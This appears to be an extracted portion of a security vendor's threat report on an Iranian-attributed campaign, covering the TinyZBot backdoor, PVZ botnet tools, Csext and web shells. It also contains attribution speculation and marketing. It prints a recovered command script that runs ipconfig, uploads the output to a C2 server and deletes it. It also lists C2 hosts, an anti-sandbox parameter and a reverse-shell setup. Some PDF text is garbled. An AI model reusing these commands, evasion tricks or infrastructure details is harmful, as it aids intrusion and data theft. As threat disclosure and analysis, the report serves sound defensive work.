TinyZBot is a backdoor developed in C#. This bot is the longest developed malware we have
analyzed from this organization. The earliest known version was compiled in January 2013 and
we continued to see new versions being created actively. The purpose of TinyZBot is to gather
information from an infected computer as well as maintain and further access into a compromised
network.

TinyZBot was developed with the clear intention of targeted campaigns. The name TinyZBot is
assumed to be referring to this project as a less versatile version of the ZeuS botnet, although
it does not exhibit the major browser injection features of ZeuS. To be clear, TinyZBot shares
no code with ZeuS or its variants, and is developed in a different programming language. The
majority of the code in TinyZBot was created by Cleaver.

TinyZBot Features
TinyZBot supports a wide array of features that continually evolved over time. For the evolution of
features, see the History section. The following is a list of supported features:
SMTP exfiltration
Log keystrokes
Monitor clipboard activity
Enable a SOAP-based command and control channel
Self-updating

TinyZBot Command and Control Protocol
The command and control mechanism for TinyZBot utilizes SOAP communicating over HTTP.
Potential reasons for using SOAP are:
1. SOAP-based communications are simple to implement in C#.
2. SOAP traffic could easily be considered benign traffic, as it is not commonly seen in malware.
As part of SOAP communications, a URI is specified. This is internal to the sub-protocol, and does
not necessarily reflect the URI of the host running the SOAP server (ASMX file). In the case of
TinyZBot, and many examples for developing SOAP applications, this URI is tempuri.org.
Since the first version of the SOAP-based command and control protocol was implemented,
TinyZBot used what is referred to as a “dynamic password”. The result of this is a
cryptographically hashed version of the server time (which must be obtained through a SOAP
query), the TinyZBot’s GUID, and the TinyZBot’s AppUsageID (campaign identifier).
For the command and control examples below, red text represents TCP data sent from the
TinyZBot infection while blue text represents TCP data sent from the command and control
server. The server time lookup query invokes the SOAP command GetServerTime.

This is the first query done by a running TinyZBot instance, and needs to be done shortly before
most other queries, in order to update the dynamic password.
Commands, updates and files to drop and execute are stored as files on the SOAP server, and
access is restricted by the AppUsageID as well as the bot GUID. This allows for commands to be
sent to all bots for a campaign as well as individual control. The TinyZBot queries the server in
order to enumerate all files currently available to it.

;20140914__084450
RUNCMD=cmd.exe,/C ipconfig /all >> “[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt”2>&1
UPLOAD=[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt
DELETE=[INFOLDER]\d2db696a-3367-4699-a815-df09098bc596.txt

The first line is a timestamp of the command. The TinyZBot command parser ignores it. The
RUNCMD line requests that cmd.exe be executed, with the command ipconfig /all being
redirected to a file in a directory designated for files to be uploaded. The UPLOAD command
requests that this file is then uploaded over SOAP to the command and control server. The
DELETE command then requests that the file be deleted from the infected system.

Deception

TinyZBot is commonly installed using some form of deception. Recent versions use the resumebased methods reported in the Initial Compromise sections. An additional method was used for
earlier versions. When early versions of TinyZBot were executed, they opened an image stored
in the resource section of the executable and copied the malicious TinyZBot executable to the
%AppData% directory.
Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe. The
backdoor additionally replaced the original malicious executable with an appropriately named
image file and padded the image file with null bytes in order to mirror the original file size.

History
The earliest known version on TinyZBot was compiled on January 27, 2013. This early version
had very little functionality. It was limited to logging keystroke data, sending emails, and creating
a link in the user’s startup folder for persistence. Its method of exfiltrating the logged keystrokes
relied upon a hardcoded email address stored in the binary. The sender email address was
dyanachear(at)beyondsys.com and emails were destined for testmail_00001(at)
yahoo.com. The message was intended to look like common Viagra spam from China, but
would be sent with the keystroke logging data as attachments, as well as system information.
The initial version did not provide any means of receiving commands and was obfuscated with
SmartAssembly. The following iteration compiled on March 12, 2013, only contained minor bug
fixes.
The next version was compiled on April 24, 2013. This version starts to look more like an
average bot. A command and control protocol was established, using HTTP and SOAP for the
protocol. The command and control server for this version was located at 173.192.144.68/
DefaultWS(dot)asmx. This new command and control protocol allowed for the addition of
quite a few other features. An update mechanism was added, and could be regularly scheduled,
so unassisted periodic update checks were automatically performed. The SOAP API used a
dynamic password mechanism, which required the computation of a simple key in order to
access certain parts of the API. The email data exfiltration method also underwent modification
to be activated at a scheduled interval. There were also some changes, which looked to be bug
fixes, such as limiting the number of times sending an email could fail.
The next day, April 25, 2013, a new version was compiled which allowed for self-deletion.
On May 14, 2013, we noticed a change which assisted in the identification of active targets.
The AppUsageId (at this point named AppType) was an identifier used by this organization in
order to differentiate between targets infected with TinyZBot, meaning they could effectively
run multiple campaigns using the same command and control server and know which target
was infected. This also allowed for separate commands to be supplied to different targets
without the need for per-bot commands. At this time, the AppUsageId was total0, but later
we observed names, which aligned with active targets. The exfiltration email address was also
changed to TerafficAnalyzer(at)yahoo.com.
On June 17, 2013, there was an addition that allowed for the loading of configuration data from
the PE’s resources. At this time, it was limited to the exfiltration email address. This version was
not obfuscated with SmartAssembly

History (cont.)
We do not see a new version of TinyZBot until June 7, 2014. There are quite a few notable
improvements, but nowhere near enough to indicate consistent development on the project for
a year. SmartAssembly was reused again. A method was added to detect what security related
software is installed. Avira antivirus was specifically targeted and disabled, due to its detection of
the new keystroke logger module added in this version. This keystroke logger source is publicly
available and referred to as DeadkeyLogger.
A new string encryption class is added, but the code was copied and pasted from a Microsoft
example. The ability to extract Internet Explorer passwords was added. Clipboard monitoring
code was added, but not invoked. The emailing features were removed, but the classes which
previously contained them were still present but empty. Many more options were enabled to
be loaded from PE resources. The ability to add PE resources was added. Another version was
compiled on June 7, 2014, with no feature difference.

On June 17, 2014, we see2the first instance of Binder_1, which is aptly named, as it is a binder.

The legitimate application used in this version of Binder_1 was compiled on August 22, 2013,
and is a self-extracting archive of desktop wallpapers, including an image from the game Mirror’s
Edge. The TinyZBot included was the version compiled on June 7, 2014.
The version compiled on June 23, 2014, added functionality which allowed screenshots of the
desktop to be taken.
On August 2, 2014, we see another version without SmartAssembly obfuscation. A bug fix is made
to the keystroke logging method, and clipboard monitoring is enabled.
Three items were compiled on August 18, 2014. Two of them are TinyZBot binaries, which contain
a minor key logging bug fix. The third is a new Binder_1 instance, which contains one of the
TinyZBot instances compiled that day. The legitimate application included in this binder is called
Easy_resume_creator and is a legitimate application named EasyRésuméCreatorPro. This
version targeted a major Saudi Arabian oil company.

From August 23 to August 26, 2014, new versions of TinyZBot were compiled with the
AppUsageIds targeting major oil and gas companies in Qatar and Kuwait, Ministries of Foreign
Affairs in the Persian Gulf, and a major airline holding company in UAE. These versions of
TinyZBot moved towards a more modular architecture where each component was in its own
.NET assembly. This was presumably done to limit antivirus detection of each individual file as
well as allow for dynamic updating of specific modules. All of these were included in their own
Binder_1 instance, which also dropped Easy_resume_creator.

History (cont.)
There also seem to be improved software engineering practices in many locations. FTP upload
support was added, with hardcoded credentials of ano:1. This FTP upload functionality points
to the command and control server, and is invoked by a command in the SOAP command and
control channel. These versions have the capability to install as a service.
On August 25, 2014, the version compiled on August 18 was submitted to VirusTotal in a ZIP
archive located at http://dl.doosan-job(dot)com/cv/Easy_Resume_Creatorv2.0.zip. This indicates that TinyZBot is not only being installed while impersonating a résumé
creation suite, but is also impersonating potential employers when distributed.
On September 9, 2014, a ZIP file containing TinyZBot and a configuration targeting a major US
university with its AppUsageId was created. This was discovered on an anonymous FTP server
in the same IP range as dl.doosan-job(dot)com along with other malware.
From September 11 through September 17, 2014, some TinyZBot components were compiled,
along with a new dropper. This dropper impersonated a tool to submit a résumé to Teledyne.
When executed, the user is prompted to enter personal information, and at the end is given a
button to submit the résumé to Teledyne, although nothing is actually submitted. While the user
enters this information, their machine is infected with TinyZBot. The AppUsageIds for these
versions target a major US-based university as well as an Israeli aerospace company. These
versions began to include a new method of installing as a service. The service runs with the
name Network Connectivity Manager.

Interesting Notes
TinyZBot, as well as some other tools (Csext, Net Crawler) initially would not run without a
command line parameter set. This was likely to avoid detonation-based detection engines. This
command line parameter was opensesemi which is often stored in the application’s code in
an obfuscated manner. The binders and droppers for TinyZBot provided this command line
argument and others when executing.
TinyZBot uses a dynamic mutex. This was accomplished by combining a static preset prefix with
the active process ID. This allowed supplemental tools to keep TinyZBot running by enumerating
every process and checking if the process ID and mutex prefix existed. If no mutex and process
pair was located, another TinyZBot instance would be started.

Backdoors
Multiple backdoors were used by this organization. These are scripts or applications that allowed
for command or code execution outside of the victim network. Many of their backdoors were web
applications, added to web servers, so commands can be executed from a browser or client able
to communicate with them. This group includes the results of the Shell Creator mentioned in the
Attribution section, as well as ASPX backdoors used by Nesha. A PHP shell was also observed,
which also included attribution to Nesha in its hashed password.

An ASPX backdoor named Zh0uSh311 was located on live servers as well as recovered from
a staging server. This backdoor does not require authentication, and its use appears to be
straightforward. Its functionality breaks down into three fairly standard components: SQL queries,
executing commands, and uploading files.

This organization utilized backdoors which masqueraded as varying versions of Notepad. They
replace the existing Notepad.exe on the infected machine, and when run they call out to a
remote server and execute any shell code returned by the remote server. There will be a detailed

PVZ
PVZ is a name for a set of executables used together to create a botnet. The name PVZ was
assigned by us as this is one of the few tools this organization has not named themselves.

is primarily unidirectional, as little information is provided from the bot to its command and
control server. The known command and control server is located at http://kundenpflege.
menrad(dot)de/js/jquery/default.aspx and the command and control protocol only uses
HTTP. The commands as well as infected computer information are transferred in the ContentDisposition HTTP header, making the traffic easy to pass over as benign.
When a command is received from the server, the results are stored in a central location on disk
that the PVZ tools utilize. Command functionality is limited to executing supplied commands,
downloading and executing executables as well as self-updating.
The debug file path for PVZ-In is:

PVZ-In has been observed using the file name ossisvc.exe.

for PVZ-Out is located at http://www.gesunddurchsjahr(dot)de/tor/default.aspx.
Much like PVZ-In, this command and control channel communicates with the Content-Disposition
HTTP header, but for file data, POST data is supplied.

Release\SendModule.pdb
PVZ-Out has been observed with the file name osppsvc.exe.

SYN Flooder
SYN Flooder is a simple network based denial of service tool. It is a command line utility capable of
being invoked by PVZ-In. Targeting information is supplied via command line parameters.
The debug file path for SYN Flooder is:
C:\Users\parviz\Documents\Visual Studio 2010\Projects\socket-test\
Release\socket-test.pdb
SYN Flooder has been observed using the name ossysvc.exe.

Logger Module
Logger Module observes the user’s actions and records them to a file. The recorded actions include
mouse clicks, active windows, keypresses, as well as clipboard data. The resulting log is written out
to a location where PVZ-Out can exfiltrate it to its command and control server. Logger Module has
been observed using the name ospcsvc.exe.
The following command and control servers for Logger Module have been observed:
212.87.154.14, Baden-Wurttemberg, Germany, kundenpflege.menrad(dot)de
212.87.154.12, Baden-Wurttemberg, Germany, www.gesunddurchsjahr(dot)de

wndTest
WndTest is the evolution of the PVZ tool chain into a single executable. The tool chain is minimized
down to a command and control communications, keystroke logging, and clipboard monitoring.
The command and control still supports upgrading, downloading, and executing of applications, as
well as executing batch scripts. WndTest installs as a service and has been observed attempting to
impersonate Adobe Report Service. WndTest starts using PHP servers for its command and control
server, some of which are listed as defaced sites.

Csext
Csext is a backdoor application developed in C# which runs as a service. Its primary functionality
is based on commands supplied by its configuration file. The configuration file is able to store
specific commands, which are intended to run at particular times. A recovered configuration is as
follows:

##
This configuration executes zhCat to connect back to srv01.microsoftwindowsupdate(dot)net (a
deceptive domain owned by this group with falsified Whois data attributing to Microsoft Investor
Relations) with XORed communication using the HTTP protocol on TCP port 443. This zhCat
instance is running cmd.exe, effectively making it a reverse connecting shell. This command
runs at 00:29 in the morning, and is killed by taskkill at 00:35. This gives the attackers a
predictable method to regain access to a compromised network if they ever lose access.
Csext also has email functionality similar to TinyZBot. This email functionality is used to exfiltrate
the results of commands from the command file which can also include requests like gathering
user information.

SPECULATION: THE WHY
Iran in 2014 can probably be best described as galvanizing. They have long been an “enemy” of
the west, and the United States in particular, but today’s headlines include a variety of topics from
nuclear talks to human rights to terrorism to cyber hacking. Iran continues to be extremely active on
the global stage – and thereby on the radar of every superpower.10
Iran’s cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard
dollars combined with national pride to help build their cyber army. Few doubt their commitment
as a government and nation state to funding and recruiting cyber warriors to infiltrate and damage
their enemies. And it has been commonly postulated that almost all activity since 2010 coming out
of Iran is associated with retaliation for Stuxnet/Duqu/Flame, which seems natural given the severity
of the impact. But they don’t need Stuxnet as motivation to want to hack the world. They have long
desired power on the political stage, in particular in the fight for nuclear power autonomy.

With the deadlines around0
the Iranian nuclear discussions pushed to 2015, the attacks may be tied
2 discussing a pact with the nuclear superpowers of United States, Britain,
to negotiating power when
France, Germany, Russia and China.
The inner workings of the Iranian government remain largely a mystery to the western world.
However, Iran’s control over its people and the private businesses birthed inside has been well
reported. In a 2014 Reuters article, the reporters detail how the secret Iranian organization called
“Setad Ejraiye Farmane Hazrate Emam” has become one of the most powerful organizations in the
country, capable of taking over properties and businesses, buying controlling interests in numerous
sectors including finance, oil, telecommunications and many others totaling in upwards of $95B.11
Even the US Treasury has documented an extensive fronting of companies in its report of Execution
of Imam Khomeini’s Order (EIKO), which through its two main subsidiaries controls 37 private
businesses that are purely front companies for the Iranian government.12
The history of Iran controlling the usage of the Internet and the very Internet on-ramps into Iran is
well known13, 14. They have controlled much of the country’s Internet access to date and have taken
over controlling interests in those companies to carry out their work. Given Operation Cleaver’s
frequent spin-up and take-down of large IP blocks inside the AFRANET IP space inside Iran,
and Iran’s well recorded investment in cyber warfare14 leads us to one simple conclusion: Iran is
extremely active in the world of hacking.

Speculation: The Why (cont.)
Involvement with North Korean
Operation Cleaver’s intense focus on critical infrastructure companies, especially in South Korea,
hints at information sharing or joint operations with Iran’s partner, North Korea. In September,
2012, Iran signed an extensive agreement for technology cooperation agreement with North
Korea, which allows for collaboration on a variety of efforts including IT and security.6
Cyber Moving to Physical
Operation Cleaver’s carefully selected targets like the oil and gas industry, energy and utility
companies, as well as airlines and airports, indicates Iran’s desire to gain deep access into the
world’s most critical environments. The end goal of this operation is not known at this time.
University Recruitment
University student recruitment was hinted at within Operation Cleaver and is consistent with
Iran’s reported history of active warrior recruitment in the educational space.15
Overall, there are many reasons that Iran may be pursuing the targets they did in Operation
Cleaver. While we may never truly know, it is important to consider all the above and more when
trying to understand the why.

CONCLUSION
After tracking the Operation Cleaver team for over two years, we’re led to the inexorable
conclusion: the government of Iran, and particularly the Islamic Revolutionary Guard Corps
(IRGC), is backing numerous groups and front entities to attack the world’s critical infrastructure.
As security experts in Critical Infrastructure and Key Resources (CIKR), Industrial Control Systems
(ICS), Supervisory Control and Data Acquisition (SCADA) systems, Building Management Systems
(BMS), embedded systems and fixed-function systems, we know how easy they are to hack.
We have worked with countless customers and vendors throughout the years to notify them of
vulnerabilities, assist with remediatation efforts, and help mitigate threats to their environments.
Unfortunately, many critical infrastructure organizations are unable to secure their complex
envirnoments against modern attacks. They fall victim to the “glue flu”, a malaise of feeling stuck,
not wanting to change the status quo for fear they will find problems that they have no idea how
to prevent. This “security anaphylaxis” spells real disaster.
If Operation Cleaver doesn’t get the world to wake up to what is happening in the silent world of
cyber, then perhaps nothing will. Prevention is everything and we should never give up until it’s
achieved.
Challenge your trusted advisors. Challenge your security vendors. Demand better technology
and services to detect, respond, but most importantly PREVENT not just contemporary attacks,
but future exotic attacks that have yet to be imagined. That is what truly disruptive and innovative
technology is. Don’t settle for anything less.
We hope that by exposing the Operation Cleaver team to the world, current global critical
infrastructure victims can be notified, and prevent future victimization from suffering the
consequences of “status quo” security. Unlike United Flight 811, perhaps we can prevent the next
disaster.

DEFENDERS, NEVER GIVE UP!

ABOUT CYLANCE
In the face of growing and evolving threats, traditional cyber protection technologies are now
widely considered inadequate. The only way to regain the upper hand against a new generation
of attackers, is to embrace something entirely new. Something that “thinks” like an attacker.
Something that doesn’t rely on a trust model or care about hash lookups. Something with a brain.
“The world has combated cyber threats by doing the same
thing over and over again ... it’s the definition of insanity!”
Jeff Moss - Co-Chair of the DHS Community Resiliency Task Force
& Founder of BlackHat and DEFCON security conferences

Cylance has eschewed the old foundations that existing cybersecurity products are built upon.
Instead, we’ve based our approach on mathematics, machine learning, and data science. This
algorithmic approach has been proven to detect – and stop – exponentially more modern threats.
Leveraging algorithmic risk modeling, CylancePROTECT protects endpoints from everyday viruses,
worms, trojans, and spyware, but unlike other security products, CylancePROTECT offers true
future-proof protection against the most malicious threats in the world. Advanced Persistent Threats
(APT), 0-days, and exotic exploitation techniques are easily detected and halted with little-to-no
impact on the end-user.
Existing reactive solutions rely on a constant stream of signature updates for threat detection, which
is not only costly and inconvenient, but also requires “sacrificial lambs”. Only after a previously
unseen threat has inflicted damage can the rest of the industry begin to detect it. CylancePROTECT
doesn’t require constant updates or even a network connection to protect against so-called
“previously undetectable” threats. By identifying and defusing attacks in near real time, before the
attack can execute, we can finally do away with the need for a “patient zero”.
As Richard Stiennon, Chief Research Analyst at IT-Harvest, put it, “Many vendors are trying to solve
the endpoint problem, yet Cylance is the only one using the power of math to stop malware and
with more effectiveness and efficiency than current solutions”.
Interested in seeing what CylancePROTECT can do for your organization? Contact us!
Cylance is one of the fastest growing cybersecurity technology firms in the US. Cylance’s flagship product
CylancePROTECT has been adopted by Fortune 500 companies and government agencies across the globe. Cylance
was founded by 27-year security industry luminary, Stuart McClure, former Global CTO of McAfee, original founder
of Foundstone, and lead author of the international best-selling book Hacking Exposed. In building Cylance, Stuart
brought together the best scientific and executive minds from the likes of Cisco, Sourcefire, Google and McAfee. The
Cylance board of advisors includes former high-ranking officials from the DHS, the FBI, CIA, and executive titans of
business.

CYLANCE PRODUCTS
CylancePROTECT is the only next generation endpoint security product that applies math to
mute existing and future malware, viruses, worms, trojans, bots, APTs, 0-days, exploits, adware,
spyware and hacking tools – without needing any updates or even a connection to the Internet.
The technology is founded on the principle that to fix the industry, you must start from scratch with
a way as yet unseen.
CylancePROTECT does not rely on signatures of any sort (blacklist or whitelist), behavioral
analysis using IOCs, sandboxing analysis, heuristics, micro-virtualization, or dynamic detonation –
to detect and prevent malicious files from executing on a target endpoint.
While every other endpoint security product must collect a sample, analyze, and write a signature
to detect it, CylancePROTECT can detect malware before it executes by statically analyzing
features found in the binary itself.

Brian Wallace
Brian is a Sr. Security Researcher for Cylance who joined shortly after the company was established.
He is best known for his avid botnet research (often going by “botnet_hunter”) and for his novel
malware analysis in the A Study in Bots blog series hosted by Cylance. Brian has been a dedicated
open-source developer as well as an advocate for public and private anti-botnet operations.
Brian actively develops techniques to combat cyber oppositions in positions where resources and
leverage are in too limited of supply for conventional means. These techniques, cultivated by Stuart
McClure, are the Art of Deterrence. In a previous investigation, Art of Deterrence techniques were
successfully used to divert Indonesian hackers motivated by monetary gain away from their highest
yielding target group.

THE OPERATION CLEAVER LOGO
The Operation Cleaver logo, created by Cylance specifically for this report, was inspired by the
infamous logo used by the Army of the Guardians of the Islamic Revolution, also known in the
west as the Iranian Revolutionary Guard Corps (IRGC). Due to the close connection between the
members tracked in this report and the IRGC, it was only fitting to replicate the look and feel of the
IRGC’s iconography as the anchor for this document’s branding.

Army of the Guardians of the
Islamic Republic (IRGC)

Operation Cleaver

The striking visual elements that make up the logo
of the IRGC have very specific meanings:

Several of the visual elements present in the IRGC
logo have been carried over to the Operation Cleaver
logo including:

•

•

•
•

•
•

72

The clenched fist holding a rifle, most likely an
AK-47, represents armed resistance.
The globe symbolizes the IRGC’s worldwide
ambitions.
The book, from which the clenched first
emanates, represents the Qur’an, connecting
the religious ideals on which the group was
founded to the armed struggle.
The plants, possibly wheat, represent
prosperity.
The name of the group in Persian, the year in
which it was founded and a passage from the
Qur’an (8:60) ‘And make ready against them all
you can of power’, are represented in text.

•
•
•

A clenched fist, this time holding a cleaver,
represents the group’s likely connection with the
IRGC as well as armed resistence in general.
The globe in the background represents
Operation Cleaver’s worldwide reach.
An ethernet cable connected to the clenched first
represents the nature of these attacks (cyber as
opposed to traditional warfare).
The hex string translates to “Think Evil, Do Good”,
a mantra our research team lives by.
